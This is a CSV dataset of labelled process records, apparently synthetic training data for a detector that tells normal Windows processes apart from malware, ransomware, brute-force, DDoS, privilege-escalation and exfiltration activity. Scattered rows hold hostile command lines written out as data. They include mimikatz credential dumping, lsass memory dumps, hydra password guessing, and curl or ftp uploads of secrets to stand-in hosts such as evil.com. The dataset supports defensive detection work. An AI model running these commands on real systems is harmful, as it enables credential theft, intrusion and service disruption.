process_name,cmdline,cpu_usage,memory_usage,pid,ppid,has_network_activity,connection_count,is_system_user,label
OUTLOOK.EXE,OUTLOOK.EXE,13.93814798315949,7.340191823157815,3143,7660,1,13,0,normal
python3.exe,python3.exe,99.0089282118677,29.452076689866047,28096,6726,0,13,1,normal
msedge.exe,msedge.exe,56.32823416739831,19.788740299607948,418,4388,0,10,1,normal
WindowsTerminal.exe,WindowsTerminal.exe,23.170068610225183,1.8083767912708666,13770,944,0,2,1,normal
explorer.exe,explorer.exe,2.5616245834425677,1.342658451239961,44648,7742,0,4,1,normal
node.exe,node.exe,96.81341007822638,7.580772942346554,55812,4668,0,4,0,normal
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,51.30166921658906,8.352458363834423,1025,758,1,14,0,privilege_escalation
printspoofer.exe,printspoofer.exe -i -c cmd,20.506645496575047,21.42184474032216,50247,737,0,17,0,privilege_escalation
chrome.exe,chrome.exe,44.12689197013756,5.158494692731647,35178,3365,0,15,0,normal
lsass.exe,lsass.exe,2.000723437428939,0.20802180154872416,102,3353,1,2,0,normal
Discord.exe,Discord.exe,16.785929350418368,9.972106678760712,30734,7921,0,14,1,normal
svchost.exe,svchost.exe,4.779369315648175,1.8839609271343372,41138,7262,0,8,0,normal
backdoor.exe,backdoor.exe --persist,29.392201708544565,16.849181390053324,11340,752,0,14,0,malware
services.exe,services.exe,1.273259748610373,0.3694488078424305,57743,3813,0,12,1,normal
SearchIndexer.exe,SearchIndexer.exe,2.74339335445866,3.2794287087868175,30289,8753,0,4,0,normal
bash.exe,bash.exe,52.98561599944045,4.134539677603067,20614,9168,0,13,0,normal
git.exe,git.exe,47.45067745752055,3.1525849306463476,6477,3781,0,1,0,normal
Docker Desktop.exe,Docker Desktop.exe,31.802629995277883,5.466493009905847,60269,8046,1,3,1,normal
Code.exe,Code.exe,11.349734863250744,7.55074552866002,18474,8471,0,12,0,normal
wsl.exe,wsl.exe,33.58595899848203,1.2561610033675934,19072,3641,0,1,0,normal
Discord.exe,Discord.exe,14.894901447906223,14.315088975228033,20344,891,0,2,1,normal
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,49.63246099791261,6.825047430057367,40749,6367,0,6,0,brute_force
Slack.exe,Slack.exe,9.731133540811374,7.68643381718621,37872,7313,1,13,1,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,92.54012626080552,16.84062757775891,15835,9263,1,14,0,brute_force
wsl.exe,wsl.exe,24.686976824572817,7.331580210905515,24491,973,1,15,1,normal
psexec.exe,psexec.exe \\target -s cmd.exe,14.551302344370885,9.233578942247384,29871,880,0,14,0,privilege_escalation
System Idle Process,System Idle Process,82.91953208626842,0.07364493366089268,39851,4527,0,0,0,normal
wsl.exe,wsl.exe,20.068696995407414,5.409995907248973,50881,2694,1,4,1,normal
locker.exe,locker.exe --wallet bc1qxy...,67.68584682053633,26.18161095187771,45032,2477,1,18,0,ransomware
Discord.exe,Discord.exe,13.928059753110524,11.40918152746479,20272,2496,0,1,1,normal
WindowsTerminal.exe,WindowsTerminal.exe,20.41258934639025,4.397605867445646,27166,7243,1,4,0,normal
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,43.21845436655901,24.839886520977014,55562,3909,1,17,0,privilege_escalation
explorer.exe,explorer.exe,0.2795780458642816,4.872245356863237,11839,4726,0,14,1,normal
tsc.exe,tsc.exe,26.72914168446523,11.225057836177509,55454,5958,0,6,0,normal
bash.exe,bash.exe,38.52464073606658,4.3398080080786094,9382,1451,0,3,0,normal
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,51.15601304260548,5.827420961022265,21092,5683,1,169,0,brute_force
devenv.exe,devenv.exe,65.51983445519828,22.432043726801794,11882,1231,0,3,1,normal
python.exe,python.exe,97.57911969163364,27.283264577344465,24665,8631,0,8,0,normal
python.exe,python.exe,74.34668144744576,25.80851481764868,54271,4031,0,2,1,normal
Code.exe,Code.exe,14.456505802770325,3.0923867649126855,44096,5904,0,12,0,normal
msedge.exe,msedge.exe,26.641934253321004,9.232862102578935,22575,491,0,9,0,normal
npm.exe,npm.exe,38.5701373144544,1.1710424409542917,1355,5428,0,4,1,normal
msedge.exe,msedge.exe,17.794296073933396,7.198477345198602,52212,8404,0,0,0,normal
hping.exe,hping.exe --flood -p 80 target.com,86.59199098061345,23.79676334205134,44761,1298,1,4303,0,ddos
services.exe,services.exe,0.32056099637852853,0.4951686081986536,56786,9952,0,2,0,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,99.20987915012391,9.533217748078105,12318,7930,0,12,0,brute_force
SearchIndexer.exe,SearchIndexer.exe,11.302813966391776,1.9942586333817913,34804,5329,0,1,0,normal
csrss.exe,csrss.exe,2.7288644537946425,0.22957617271265923,35396,1764,0,15,1,normal
stress.exe,stress.exe --cpu 16 --flood,90.56947882847278,24.28556040981556,61727,9309,1,366,0,ddos
OUTLOOK.EXE,OUTLOOK.EXE,21.852399030431737,4.931966840974448,11229,4599,0,13,0,normal
cryptor.exe,cryptor.exe -aes256 -all,79.42443600217896,26.140582901177144,36125,2846,0,14,0,ransomware
firefox.exe,firefox.exe,36.03966046016438,24.234242625012577,64745,2762,1,11,0,normal
node.exe,node.exe,98.88974794459592,23.280884914566425,11175,592,1,5,0,normal
explorer.exe,explorer.exe,2.7325028226221217,4.804061354643869,28476,2480,0,0,0,normal
loic.exe,loic.exe --target 192.168.1.1,90.32377636967674,21.209237981962932,34805,9920,1,460,0,ddos
bash.exe,bash.exe,45.88075390999266,4.569648665967961,4103,925,0,13,0,normal
chrome.exe,chrome.exe,0.09722270923014142,25.273382751059327,10356,1695,0,14,0,normal
ftp.exe,ftp.exe -s:script.txt evil-server.com,21.653658609438924,18.6742313490183,18005,4177,0,10,0,data_exfiltration
git.exe,git.exe,45.674873704300616,3.41404269816919,2723,5775,0,10,0,normal
stress.exe,stress.exe --cpu 16 --flood,95.7278695456339,14.68870196070374,49697,3729,1,333,0,ddos
chrome.exe,chrome.exe,67.64677626705121,11.917400664024498,59437,654,1,10,0,normal
MSBuild.exe,MSBuild.exe,21.32812153556054,9.911613293544132,17789,4464,0,1,0,normal
Docker Desktop.exe,Docker Desktop.exe,10.215377330507378,9.169198808903685,51613,6101,0,9,1,normal
stress.exe,stress.exe --cpu 16 --flood,96.89301124265275,15.146687683623941,30360,3032,1,250,0,ddos
python.exe,python.exe,94.36391849557315,26.43280845093627,44153,5102,0,2,0,normal
System Idle Process,System Idle Process,91.32512230371255,0.03764036736184428,42424,1537,0,7,0,normal
docker.exe,docker.exe,44.9941600322511,7.484629725202718,14190,9641,0,10,0,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,92.25793587466636,27.76120838691099,55475,1732,1,10,0,brute_force
explorer.exe,explorer.exe,2.8484605477398492,1.7526364139042632,41618,6574,1,7,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,10.381365172794172,8.962530888174346,35099,2528,0,0,0,normal
Teams.exe,Teams.exe,21.76927991469414,9.173896843887192,30645,8748,0,1,0,normal
lsass.exe,lsass.exe,0.26818365584516446,0.5249101361358935,24504,4628,0,7,0,normal
git.exe,git.exe,34.492618450308676,3.0096503973615296,13287,4396,0,2,0,normal
wsl.exe,wsl.exe,34.832238061498686,9.702803936492941,3794,6157,0,8,0,normal
SearchIndexer.exe,SearchIndexer.exe,21.929222214284945,4.649074348864991,10137,7688,0,1,0,normal
lsass.exe,lsass.exe,4.81919209863061,1.5983458851459005,56091,4474,1,8,0,normal
SearchIndexer.exe,SearchIndexer.exe,23.140010591916038,2.7720291817919733,714,3540,0,8,1,normal
cmd.exe,cmd.exe,15.94238485380943,0.12076402651730396,3194,2636,0,0,0,normal
encrypt.exe,encrypt.exe --recursive C:\Users,61.745327111817915,10.932201156106807,11221,7528,0,14,0,ransomware
csrss.exe,csrss.exe,0.5943461275959021,0.381570972888414,47231,5386,0,8,0,normal
System Idle Process,System Idle Process,89.69831500301684,0.00887542070316818,58986,3243,0,0,0,normal
powershell.exe,powershell.exe,19.347972022316085,3.619030685944649,10309,2258,1,7,0,normal
Code.exe,Code.exe,14.942547660969597,4.805300821079133,14767,8001,0,11,1,normal
python3.exe,python3.exe,45.60830444452038,16.883655132054194,19380,6829,0,10,0,normal
docker.exe,docker.exe,14.844943274207928,2.466752225853025,14776,5890,0,10,0,normal
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,50.99815412463372,12.510015713959255,27939,1735,1,9,0,brute_force
wsl.exe,wsl.exe,26.828884011589604,7.183195946105506,985,8695,0,6,1,normal
explorer.exe,explorer.exe,7.517224656328018,1.965576616789995,4249,7624,1,3,0,normal
cmd.exe,cmd.exe,28.10728455697107,1.118822441396221,21824,4565,0,8,0,normal
tsc.exe,tsc.exe,34.70540083514493,9.836971508021561,10162,5765,0,13,0,normal
chrome.exe,chrome.exe,68.51122882716575,16.427752056335432,9065,542,1,9,1,normal
python3.exe,python3.exe,96.20413167889731,19.063917128200877,63818,4858,0,7,1,normal
ftp.exe,ftp.exe -s:script.txt evil-server.com,27.42172375870473,27.922082039954056,44333,7524,0,7,0,data_exfiltration
git.exe,git.exe,0.7216546981191896,0.6163664726270652,11626,3830,0,3,0,normal
powershell.exe,powershell.exe,32.25494874317807,11.677590226655377,43512,5177,0,11,0,normal
python3.exe,python3.exe,73.2069175926987,3.0629641449406186,9679,7721,1,10,0,normal
services.exe,services.exe,1.4232762991237196,0.6789112894800695,51040,4019,1,6,0,normal
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,45.18983555013471,20.897166870259824,43898,9098,1,19,0,brute_force
git.exe,git.exe,27.019258411085158,3.9514170605988572,35156,9672,0,10,0,normal
dwm.exe,dwm.exe,17.971958573480904,2.6871308514520513,47750,6256,0,3,0,normal
explorer.exe,explorer.exe,8.475288337162901,1.748746433963607,32338,2783,0,2,0,normal
node.exe,node.exe,76.62217264137182,1.1672225508755485,6309,1767,0,10,1,normal
Slack.exe,Slack.exe,13.491054412895378,10.285473425148844,19679,2538,0,3,1,normal
npm.exe,npm.exe,88.59726750295992,6.219219709993422,57015,6206,0,9,0,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,85.1948459017126,7.960804965097741,11697,8749,1,14,0,brute_force
csrss.exe,csrss.exe,1.4036238133364578,0.1975437582896949,26898,29,0,9,0,normal
bash.exe,bash.exe,37.968535862813496,3.230001234738364,9874,7170,1,6,0,normal
encrypt.exe,encrypt.exe --recursive C:\Users,95.7250731333616,7.673788512715963,48220,9055,1,0,0,ransomware
Code.exe,Code.exe,10.394237685857183,7.73697245089131,21218,1700,0,11,0,normal
stress.exe,stress.exe --cpu 16 --flood,91.72905756699616,14.558826926228456,12545,8237,1,996,0,ddos
mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,35.37537816814016,22.941981652819578,42277,3843,0,17,0,malware
docker.exe,docker.exe,39.98323047366927,2.927865532008325,47643,1470,1,5,0,normal
System,System,1.6757150709548525,0.19908662943183925,59046,6218,0,9,1,normal
python.exe,python.exe,55.43728452008524,17.295788447938296,62665,1823,0,8,0,normal
System,System,4.944208360796799,0.1757478891836633,29506,8541,0,4,0,normal
npm.exe,npm.exe,27.514692748582814,16.82999945949463,42146,1085,0,9,1,normal
Code.exe,Code.exe,37.04377798699267,13.767446411289662,5852,5637,1,0,1,normal
dwm.exe,dwm.exe,1.2041507359942498,8.2871076031402,27661,5950,0,14,1,normal
procdump.exe,procdump.exe -ma lsass.exe lsass.dmp,51.069638857683984,23.46635249170545,28855,1458,1,8,0,privilege_escalation
explorer.exe,explorer.exe,8.695351776487556,2.6143634326912184,45023,6251,0,5,0,normal
Docker Desktop.exe,Docker Desktop.exe,36.55293799648937,10.095072390574119,36072,1891,0,11,0,normal
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,45.21510429707016,20.443684122930218,35794,3224,1,187,0,brute_force
wsl.exe,wsl.exe,29.36455766691598,4.028073544100973,8228,3827,0,12,0,normal
System,System,0.3648807320542624,0.2185903485321068,31043,5344,0,2,1,normal
winpeas.exe,winpeas.exe,34.55785084659538,17.650075792780953,38153,7942,1,19,0,privilege_escalation
Discord.exe,Discord.exe,0.23393309654581862,6.168059491108051,3064,1836,1,0,1,normal
svchost.exe,svchost.exe,3.876125444931912,2.70558574592823,51039,2395,0,3,0,normal
node.exe,node.exe,39.72898090036134,4.062060584357913,60272,6472,0,7,0,normal
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,46.51577591812506,6.149427796493857,40186,3288,1,319,0,brute_force
python.exe,python.exe,10.217861141722883,4.7489675106855875,9937,433,0,1,0,normal
python.exe,python.exe,7.101950881697661,19.247132406763075,34062,7728,0,1,0,normal
backdoor.exe,backdoor.exe --persist,23.681482737278827,17.06241398147027,33749,9281,1,1,0,malware
System Idle Process,System Idle Process,82.56352471754288,0.02397329476035842,43513,3275,0,1,1,normal
stress.exe,stress.exe --cpu 16 --flood,90.72080728048492,8.248056645451763,61261,5609,1,482,0,ddos
hping.exe,hping.exe --flood -p 80 target.com,90.50042501133618,7.758150188378222,50504,4620,1,3577,0,ddos
powershell.exe,powershell.exe,27.735243098753756,2.6952800000588626,43367,6967,1,10,0,normal
java.exe,java.exe,67.76796956644908,31.117182413091115,53727,391,1,0,0,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,81.51999669515585,11.640788369231547,48719,7925,0,14,0,brute_force
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,94.76200734809491,24.99163774740372,58695,9709,0,20,0,brute_force
java.exe,java.exe,68.30250171796585,29.329427240061232,1752,1035,1,1,1,normal
services.exe,services.exe,1.3879274812532396,0.2681806596757722,21625,4623,0,15,0,normal
ransom.exe,ransom.exe --encrypt --payment,69.54416601841089,17.86853938923789,49918,9129,1,11,0,ransomware
winpeas.exe,winpeas.exe,60.99593509436696,8.365404049235726,31097,9975,1,4,0,privilege_escalation
System Idle Process,System Idle Process,85.85549952788611,0.03191075373894552,45648,1875,0,6,0,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,15.600867589939243,6.430138872822079,28335,5963,0,3,0,data_exfiltration
bash.exe,bash.exe,17.64375243285845,2.9423138240298163,48498,2409,0,4,0,normal
MsMpEng.exe,MsMpEng.exe,38.80080578435562,3.3014883790974343,41408,2067,0,8,0,normal
bash.exe,bash.exe,41.15187570332445,2.836035505193838,50944,3851,0,8,1,normal
python.exe,python.exe,32.53724680825313,14.877947791898174,59153,322,0,13,0,normal
docker.exe,docker.exe,15.194571757242748,4.135954188281991,12353,5949,0,11,1,normal
node.exe,node.exe,82.88663425842124,1.3144914141868975,51901,8904,0,6,0,normal
powershell.exe,powershell.exe,37.46252073974761,3.6449493780128064,38399,3274,0,9,1,normal
SearchIndexer.exe,SearchIndexer.exe,23.596407736811045,2.2157155926376793,25553,4631,0,6,0,normal
SearchIndexer.exe,SearchIndexer.exe,4.947134417923556,2.8091291623985226,52455,378,0,12,1,normal
hping.exe,hping.exe --flood -p 80 target.com,80.42736505867549,14.004480695200053,58446,9965,1,3965,0,ddos
python.exe,python.exe,9.269476486809713,25.84403978095555,6657,9303,0,0,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,24.367649711731293,4.672574299684892,18244,3169,0,7,1,normal
csrss.exe,csrss.exe,0.3267615979702798,0.18296087980080994,41156,787,1,4,0,normal
backdoor.exe,backdoor.exe --persist,9.039429799440878,11.5548216623409,60316,787,1,14,0,malware
Docker Desktop.exe,Docker Desktop.exe,22.851673932753457,5.06384062345623,53013,9172,0,5,0,normal
psexec.exe,psexec.exe \\target -s cmd.exe,24.867277637077997,25.039482772324792,26079,2193,1,16,0,privilege_escalation
juicypotato.exe,juicypotato.exe -l 1337 -p cmd.exe,49.55560452398019,26.56382478435739,55605,212,0,9,0,privilege_escalation
payload.exe,payload.exe --silent,73.35203031650826,14.638450506693195,11184,1677,0,11,0,malware
Code.exe,Code.exe,7.933832704669841,13.734207374768783,5947,4987,1,11,0,normal
java.exe,java.exe,85.22912534709923,31.5124756866328,54729,7158,0,3,0,normal
winpeas.exe,winpeas.exe,65.66276464244316,12.024226750030099,45781,9147,0,20,0,privilege_escalation
chrome.exe,chrome.exe,44.044778640695405,9.386809606187086,51176,3894,0,3,0,normal
chrome_update.exe,chrome_update.exe --no-ui,33.72608941857716,23.529859078254603,21145,5985,1,6,0,trojan
encrypt.exe,encrypt.exe --recursive C:\Users,79.7881364308985,21.930835558327757,15763,2375,0,13,0,ransomware
git.exe,git.exe,39.630237208507836,2.7075702626746256,59137,5411,0,2,0,normal
chrome_update.exe,chrome_update.exe --no-ui,17.44249240319321,10.434573495941994,53207,891,1,11,0,trojan
Slack.exe,Slack.exe,18.382043820807777,13.643437741374898,26553,1014,0,1,0,normal
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,19.14946258233382,26.9926133715431,24937,4069,1,1,0,trojan
Discord.exe,Discord.exe,11.457586154033203,11.449748393952065,60420,4253,0,10,0,normal
npm.exe,npm.exe,20.920183144090988,11.330895351323404,57247,7241,1,13,1,normal
python.exe,python.exe,37.27423297728397,22.239171034501314,27169,1709,1,9,1,normal
wsl.exe,wsl.exe,45.997170168450054,9.978590832006606,27196,1449,0,10,1,normal
explorer.exe,explorer.exe,4.75178435646413,2.910793192212951,11962,5741,0,10,0,normal
System,System,0.9129257071031566,0.10892294050750223,1162,1971,0,3,0,normal
lsass.exe,lsass.exe,2.741093219097506,1.342966429824624,1871,5356,0,9,0,normal
wsl.exe,wsl.exe,41.54786298054338,9.596845237836925,33463,2718,0,13,0,normal
locker.exe,locker.exe --wallet bc1qxy...,80.83125765629397,7.894605456179397,32269,4708,0,7,0,ransomware
bash.exe,bash.exe,50.1466807085145,1.2360574590628992,31415,3818,0,6,0,normal
bash.exe,bash.exe,4.694471651208778,2.9801800157655554,28529,2798,0,15,0,normal
update.exe,update.exe --silent --download http://evil.com/payload,32.43155118583664,12.639416869837406,17450,2380,0,12,0,trojan
svchost.exe,svchost.exe -connect 185.141.62.123:443,21.93850677526291,11.072800867052164,63061,9527,1,4,0,trojan
docker.exe,docker.exe,36.62373155327717,4.765027054791089,22336,341,0,9,0,normal
Teams.exe,Teams.exe,7.612717749707507,18.990544035509366,25301,1568,1,14,1,normal
update.exe,update.exe --silent --download http://evil.com/payload,19.98184630276683,19.14523022615556,50554,8997,0,12,0,trojan
powershell.exe,powershell.exe,46.32707204434755,8.898195256210812,25212,4687,0,13,0,normal
lsass.exe,lsass.exe,0.541809576412654,0.7705834835389384,28379,295,0,2,1,normal
Slack.exe,Slack.exe,0.6922199099998222,11.102029392812566,57779,6832,0,15,0,normal
juicypotato.exe,juicypotato.exe -l 1337 -p cmd.exe,38.43646675237879,7.692406819697729,23700,870,1,20,0,privilege_escalation
locker.exe,locker.exe --wallet bc1qxy...,71.42518631831761,16.45091480798723,41374,7828,0,19,0,ransomware
git.exe,git.exe,30.825112244815777,3.4852379795420756,9318,1266,0,7,1,normal
SearchIndexer.exe,SearchIndexer.exe,8.228353579634001,2.80855142586458,45723,3829,0,4,0,normal
powershell.exe,powershell.exe,45.93863179691386,5.162206727160755,34217,4468,0,9,1,normal
explorer.exe,explorer.exe,8.210467166364126,3.7322732766438134,46497,9108,0,12,0,normal
powershell.exe,powershell.exe,19.675466319638122,9.697353271734082,11800,7178,0,15,0,normal
Teams.exe,Teams.exe,31.08166804742352,13.353281936581084,18344,460,0,12,0,normal
webpack.exe,webpack.exe,49.70956848422388,4.002454362198831,38333,4167,1,15,0,normal
juicypotato.exe,juicypotato.exe -l 1337 -p cmd.exe,37.59765655228769,15.034925957834792,18855,6738,1,14,0,privilege_escalation
procdump.exe,procdump.exe -ma lsass.exe lsass.dmp,45.71556515906666,22.73561285740324,64172,2330,1,5,0,privilege_escalation
Code.exe,Code.exe,39.858561349138924,10.29214256794697,57936,2437,0,10,1,normal
lsass.exe,lsass.exe,1.9430778014286698,1.7099888444075813,50088,4577,0,3,0,normal
devenv.exe,devenv.exe,41.90217050983841,15.932078764333955,25882,3143,0,13,0,normal
node.exe,node.exe,76.1424795417783,22.53075100437934,50052,7390,0,1,0,normal
lsass.exe,lsass.exe,0.17956616960912108,0.6670278572667454,20435,3925,0,8,0,normal
